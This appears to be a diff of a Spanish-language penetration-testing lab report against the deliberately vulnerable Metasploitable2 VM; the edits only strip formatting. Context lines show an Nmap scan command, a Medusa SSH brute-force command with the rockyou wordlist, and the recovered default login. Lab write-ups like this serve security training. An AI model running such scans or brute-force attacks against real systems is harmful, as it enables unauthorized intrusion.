@@ -3,7 +3,7 @@
 ## Ataque 1 — Reconocimiento con Nmap
 
 **Herramienta:** Nmap 7.98  
-**Comando:** `sudo nmap -sS -A 10.0.2.5`  
+**Comando:** sudo nmap -sS -A 10.0.2.5  
 **Objetivo:** Metasploitable2 (10.0.2.5)  
 
 ### Servicios descubiertos
@@ -32,7 +32,7 @@
 **Herramienta:** Medusa v2.3  
 **Comando:** `medusa -h 10.0.2.5 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -v 4`  
 **Objetivo:** Puerto 22 (SSH) de Metasploitable2  
-**Resultado:** ✅ ACCOUNT FOUND — msfadmin:msfadmin  
+**Resultado:**  ACCOUNT FOUND — msfadmin:msfadmin  
 
 **Ataque de fuerza bruta en curso:**
 
